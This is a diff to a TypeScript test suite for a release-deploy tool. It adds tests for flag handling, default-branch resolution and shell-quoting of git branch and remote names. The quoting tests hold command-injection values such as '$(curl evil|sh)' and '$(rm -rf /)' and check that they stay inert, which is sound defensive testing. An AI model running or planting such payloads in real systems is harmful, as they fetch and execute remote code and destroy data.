@@ -115,7 +115,7 @@ describe('release deploy — happy path', () => {
     expect(joined).toContain(`worktree add --detach /srv/app/releases/a1b2c3d4e5f6-20260710T090000Z ${SHA}`);
     // Fetch MUST use an explicit refspec so a `git clone --bare` repo (no configured
     // refspec) actually updates refs/heads/* — else it builds a stale sha (SMH-116).
-    expect(joined).toContain("fetch --prune origin '+refs/heads/*:refs/heads/*'");
+    expect(joined).toContain("fetch --prune 'origin' '+refs/heads/*:refs/heads/*'");
     // atomic activation via mv -Tf onto current.
     expect(calls.some((cmd) => /mv -Tf .*\/srv\/app\/current/.test(cmd))).toBe(true);
     // ordering: install → build → stop → backup → migrate → flip.
@@ -134,8 +134,8 @@ describe('release deploy — happy path', () => {
     const runtime = {
       execFileSync: (_f: string, args: string[]) => {
         const cmd = args[args.length - 1];
-        if (cmd.includes('rev-parse origin/master')) return 'origin/master'; // unresolved
-        if (cmd.includes('rev-parse refs/heads/master')) return SHA;
+        if (cmd.includes("rev-parse 'origin'/'master'")) return 'origin/master'; // unresolved
+        if (cmd.includes("rev-parse refs/heads/'master'")) return SHA;
         return (rt.runtime.execFileSync as any)(_f, args);
       },
     };
@@ -153,8 +153,8 @@ describe('release deploy — happy path', () => {
     const runtime = {
       execFileSync: (_f: string, args: string[]) => {
         const cmd = args[args.length - 1];
-        if (cmd.includes('rev-parse origin/master')) return STALE;       // stale remote-tracking ref
-        if (cmd.includes('rev-parse refs/heads/master')) return SHA;      // current local head
+        if (cmd.includes("rev-parse 'origin'/'master'")) return STALE;       // stale remote-tracking ref
+        if (cmd.includes("rev-parse refs/heads/'master'")) return SHA;      // current local head
         return (rt.runtime.execFileSync as any)(_f, args);
       },
     };
@@ -164,7 +164,7 @@ describe('release deploy — happy path', () => {
   });
 
   it('restarts from the stable ecosystem (never a baked release path) and verifies cwd', () => {
-    const { runtime, calls, inputs } = makeReleaseRuntime();
+    const { runtime, calls } = makeReleaseRuntime();
     release.deployRelease(relConfig(), {}, ctx(runtime));
     expect(calls.some((cmd) => cmd.includes('pm2 startOrRestart /srv/app/shared/ecosystem.config.cjs'))).toBe(true);
     expect(calls.some((cmd) => cmd.includes('readlink -f /proc/111/cwd'))).toBe(true);
@@ -422,6 +422,163 @@ describe('release deploy — safety hardening (Codex review fixes)', () => {
     expect(rt.calls.some((cmd) => cmd.includes('worktree remove --force /srv/app/releases/00000000cccc-20260707T090000Z'))).toBe(true);
     expect(rt.calls.some((cmd) => cmd.includes('not-a-release-dir'))).toBe(false);
     expect(rt.calls.some((cmd) => cmd.includes('worktree remove --force /srv/app/releases/00000000bbbb'))).toBe(false);
+  });
+});
+
+describe('release deploy — flag honoring vs rejection under the release layout', () => {
+  it('honors --skip-deps: no install command runs and "install" is absent from steps', () => {
+    const { runtime, calls } = makeReleaseRuntime();
+    const result = release.deployRelease(relConfig(), { skipDeps: true }, ctx(runtime));
+    expect(calls.some((cmd) => cmd.includes('npm ci'))).toBe(false);
+    expect(result.steps).not.toContain('install');
+    // the build step is unaffected by --skip-deps.
+    expect(result.steps).toContain('build');
+  });
+
+  it('honors --skip-build: no build command runs and "build" is absent from steps', () => {
+    const { runtime, calls } = makeReleaseRuntime();
+    const result = release.deployRelease(relConfig(), { skipBuild: true }, ctx(runtime));
+    expect(calls.some((cmd) => cmd.includes('npm run build'))).toBe(false);
+    expect(result.steps).not.toContain('build');
+    // install is unaffected by --skip-build.
+    expect(result.steps).toContain('install');
+  });
+
+  it('rejects --no-stash with a clear error naming the flag (no working-tree stash under this layout)', () => {
+    const { runtime, calls } = makeReleaseRuntime();
+    expect(() => release.deployRelease(relConfig(), { stash: false }, ctx(runtime))).toThrow(/--no-stash does not apply/);
+    // nothing was touched — the rejection happens before any target command runs.
+    expect(calls.length).toBe(0);
+  });
+
+  it('rejects --skip-build for release-layout rollback (no rebuild step exists there)', () => {
+    const { runtime, calls } = makeReleaseRuntime();
+    expect(() => release.rollbackRelease(relConfig(), { skipBuild: true }, ctx(runtime))).toThrow(/--skip-build does not apply/);
+    expect(calls.length).toBe(0);
+  });
+
+  it('rejects --skip-deps for release-layout rollback (no install step exists there)', () => {
+    const { runtime, calls } = makeReleaseRuntime();
+    expect(() => release.rollbackRelease(relConfig(), { skipDeps: true }, ctx(runtime))).toThrow(/--skip-deps does not apply/);
+    expect(calls.length).toBe(0);
+  });
+});
+
+describe('release deploy — default-branch resolution (Bug 2)', () => {
+  it('with branch: null, resolves origin/HEAD instead of hardcoding master (repo whose default is main)', () => {
+    const rt = makeReleaseRuntime();
+    const runtime = {
+      execFileSync: (_f: string, args: string[]) => {
+        const cmd = args[args.length - 1];
+        // The shared resolveBranch call, scoped to the bare mirror via --git-dir.
+        if (cmd.includes("rev-parse --abbrev-ref 'origin'/HEAD")) return 'origin/main';
+        // The subsequent SHA resolution now looks up refs/heads/main, not master.
+        if (cmd.includes("rev-parse refs/heads/'main'")) return SHA;
+        if (cmd.includes("rev-parse refs/heads/'master'")) throw new Error('should not resolve refs/heads/master when the default branch is main');
+        return (rt.runtime.execFileSync as any)(_f, args);
+      },
+    };
+    const result = release.deployRelease(relConfig({ branch: null }), {}, ctx(runtime));
+    expect(result.branch).toBe('main');
+    expect(result.sha).toBe(SHA);
+    expect(result.steps).toContain('flip');
+  });
+
+  it('with branch: null and no resolvable origin/HEAD, falls back to master', () => {
+    const rt = makeReleaseRuntime();
+    const runtime = {
+      execFileSync: (_f: string, args: string[]) => {
+        const cmd = args[args.length - 1];
+        if (cmd.includes("rev-parse --abbrev-ref 'origin'/HEAD")) return ''; // unresolvable
+        return (rt.runtime.execFileSync as any)(_f, args);
+      },
+    };
+    const result = release.deployRelease(relConfig({ branch: null }), {}, ctx(runtime));
+    expect(result.branch).toBe('master');
+  });
+});
+
+describe('PKG-82 Bug 6: release layout quotes branch/remote at the git call site (defense in depth)', () => {
+  it('quotes a branch resolved from a hostile origin/HEAD (;, backticks, $(...)) so it cannot break out', () => {
+    // The target's own `origin/HEAD` is attacker-influenceable (whoever can rename
+    // the repo's default branch controls it) and git's check-ref-format permits
+    // `;`, backticks, `$()` in a refname. resolveBranch (src/branch.js) resolves
+    // this, and deployRelease interpolates it into `git rev-parse refs/heads/<branch>`
+    // on the target — assert the emitted command shell-quotes it rather than
+    // executing the injected command.
+    const evilBranch = 'master; `curl evil|sh` $(rm -rf /)';
+    const rt = makeReleaseRuntime();
+    const calls: string[] = [];
+    const runtime = {
+      execFileSync: (f: string, args: string[]) => {
+        const cmd = args[args.length - 1];
+        calls.push(cmd);
+        // The shared resolveBranch call, scoped to the bare mirror via --git-dir.
+        if (cmd.includes("rev-parse --abbrev-ref 'origin'/HEAD")) return `origin/${evilBranch}`;
+        return (rt.runtime.execFileSync as any)(f, args);
+      },
+    };
+    const result = release.deployRelease(relConfig({ branch: null }), {}, ctx(runtime));
+    expect(result.branch).toBe(evilBranch);
+    const joined = calls.join('\n');
+    expect(joined).toContain(`rev-parse refs/heads/'${evilBranch}'`);
+    // never present unquoted in a way that would let the shell run it.
+    expect(joined).not.toContain(`rev-parse refs/heads/${evilBranch}`);
+  });
+
+  it('quotes a `$()` command-substitution branch name as an inert literal in the fallback origin/<branch> lookup', () => {
+    // Force the primary `refs/heads/<branch>` lookup to fail (an invalid/non-hex
+    // result) so deployRelease falls back to resolveSha(`${remote}/${branch}`) —
+    // the second unquoted interpolation the ticket calls out.
+    const evilBranch = '$(curl evil|sh)';
+    const rt = makeReleaseRuntime();
+    const calls: string[] = [];
+    const runtime = {
+      execFileSync: (f: string, args: string[]) => {
+        const cmd = args[args.length - 1];
+        calls.push(cmd);
+        if (cmd.includes(`rev-parse refs/heads/'${evilBranch}'`)) return 'not-a-sha'; // fails the 40-hex check
+        if (cmd.includes(`rev-parse 'origin'/'${evilBranch}'`)) return SHA;
+        return (rt.runtime.execFileSync as any)(f, args);
+      },
+    };
+    const result = release.deployRelease(relConfig({ branch: evilBranch }), {}, ctx(runtime));
+    expect(result.sha).toBe(SHA);
+    const joined = calls.join('\n');
+    expect(joined).toContain(`rev-parse 'origin'/'${evilBranch}'`);
+    expect(joined).not.toContain(`rev-parse origin/${evilBranch}`);
+  });
+
+  it('escapes an embedded single quote in the branch so it cannot break out of the quoting', () => {
+    const evilBranch = "master'; curl evil|sh #";
+    const rt = makeReleaseRuntime();
+    const calls: string[] = [];
+    const runtime = {
+      execFileSync: (f: string, args: string[]) => {
+        const cmd = args[args.length - 1];
+        calls.push(cmd);
+        return (rt.runtime.execFileSync as any)(f, args);
+      },
+    };
+    release.deployRelease(relConfig({ branch: evilBranch }), {}, ctx(runtime));
+    const joined = calls.join('\n');
+    expect(joined).toContain(`rev-parse refs/heads/'master'\\''; curl evil|sh #'`);
+  });
+
+  it('quotes config.remote in the bare-mirror fetch, even with shell metacharacters', () => {
+    const rt = makeReleaseRuntime();
+    const calls: string[] = [];
+    const runtime = {
+      execFileSync: (f: string, args: string[]) => {
+        const cmd = args[args.length - 1];
+        calls.push(cmd);
+        return (rt.runtime.execFileSync as any)(f, args);
+      },
+    };
+    release.deployRelease(relConfig({ remote: 'origin;curl evil|sh' }), {}, ctx(runtime));
+    const joined = calls.join('\n');
+    expect(joined).toContain(`fetch --prune 'origin;curl evil|sh' '+refs/heads/*:refs/heads/*'`);
+    expect(joined).not.toContain('fetch --prune origin;curl evil|sh ');
   });
 });
 
